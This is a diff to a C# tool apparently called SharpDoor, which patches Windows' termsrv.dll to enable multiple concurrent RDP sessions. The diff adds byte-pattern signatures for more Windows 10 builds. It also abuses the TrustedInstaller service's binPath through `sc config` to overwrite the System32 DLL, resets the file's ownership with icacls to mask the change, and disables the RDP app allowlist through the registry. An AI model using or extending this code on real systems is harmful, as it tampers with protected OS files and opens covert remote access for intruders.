@@ -47,17 +47,28 @@ namespace SharpDoor {
 				Thread.Sleep(2000);
 
 				Console.WriteLine("\n[*] Attempting to patch termsrv.dll");
-				PatchFile(@"C:\Users\Public\termsrv.dll", termsrv_src);
+				PatchFile(@"C:\Users\Public\termsrv.dll", @"C:\Users\Public\termsrv.patch.dll");
+                Thread.Sleep(2000);
 
-				Console.WriteLine("[*] Start termservice");
+                executeCommand("sc config TrustedInstaller binPath= \"cmd /c move C:\\Users\\Public\\termsrv.patch.dll C:\\Windows\\System32\\termsrv.dll\"");
+                executeCommand("sc start \"TrustedInstaller\"");
+                Thread.Sleep(2000);
+
+                executeCommand("icacls \"C:\\Windows\\System32\\termsrv.dll\" /setowner \"NT SERVICE\\TrustedInstaller\"");
+				executeCommand("icacls \"C:\\Windows\\System32\\termsrv.dll\" /grant \"NT SERVICE\\TrustedInstaller:(RX)\"");
+
+                Console.WriteLine("[*] Setting Registry Terminal Server\\fSingleSessionPerUser to 0");
+                RegistryKey reg_key1 = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server");
+                reg_key1.SetValue("fSingleSessionPerUser", 0, RegistryValueKind.DWord);
+
+                Console.WriteLine("[*] Setting Registry Terminal Server\\TSAppAllowList\\fDisabledAllowList to 1");
+                RegistryKey reg_key2 = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\TSAppAllowList");
+                reg_key2.SetValue("fDisabledAllowList", 1, RegistryValueKind.DWord);
+
+                Console.WriteLine("[*] Start termservice");
 				executeCommand(@"net start termservice /y");
 
-				Console.WriteLine("[*] Attempting To Change Registry Key fSingleSessionPerUser For Enabling Single Session Per User");
-
-				RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server");
-				key.SetValue("fSingleSessionPerUser", 0, RegistryValueKind.DWord);
-
-				Console.WriteLine("[*] Done");
+                Console.WriteLine("[*] Done");
 			}
 			catch(Exception e) {
 				Console.WriteLine("\r\n[!] Unhandled SharpDoor exception:\r\n");
@@ -106,10 +117,14 @@ namespace SharpDoor {
 
 		private static void TermsrvPatchVersion(string termsrvVersion) {
 			// www.mysysadmintips.com/windows/clients/545-multiple-rdp-remote-desktop-sessions-in-windows-10
-			if (termsrvVersion == "10.0.17763.1" || termsrvVersion == "10.0.17763.437") {
-				PatchFind = new byte[] { 0x39, 0x81, 0x3C, 0x06, 0x00, 0x00, 0x0F, 0x84, 0x3B, 0x2B, 0x01, 0x00 };
+			if (termsrvVersion == "10.0.17763.1") {
+				PatchFind = new byte[] { 0x39, 0x81, 0x3C, 0x06, 0x00, 0x00, 0x0F, 0x84, 0x7F, 0x2C, 0x01, 0x00 };
 			}
-			else if (termsrvVersion == "10.0.17134.1") {
+            else if (termsrvVersion == "10.0.17763.437")
+            {
+                PatchFind = new byte[] { 0x39, 0x81, 0x3C, 0x06, 0x00, 0x00, 0x0F, 0x84, 0x3B, 0x2B, 0x01, 0x00 };
+            }
+            else if (termsrvVersion == "10.0.17134.1") {
 				PatchFind = new byte[] { 0x8B, 0x99, 0x3C, 0x06, 0x00, 0x00, 0x8B, 0xB9, 0x38, 0x06, 0x00, 0x00 };
 			}
 			else if (termsrvVersion == "10.0.16299.15") {
@@ -118,7 +133,11 @@ namespace SharpDoor {
 			else if (termsrvVersion == "10.0.10240.16384") {
 				PatchFind = new byte[] { 0x39, 0x81, 0x3C, 0x06, 0x00, 0x00, 0x0F, 0x84, 0x73, 0x42, 0x02, 0x00 };
 			}
-			else {
+            else if (termsrvVersion == "10.0.10586.0")
+            {
+                PatchFind = new byte[] { 0x39, 0x81, 0x3C, 0x06, 0x00, 0x00, 0x0F, 0x84, 0x3F, 0x42, 0x02, 0x00 };
+            }
+            else {
 				Console.WriteLine("[!] Unknown Version");
 				System.Environment.Exit(0);
 			}
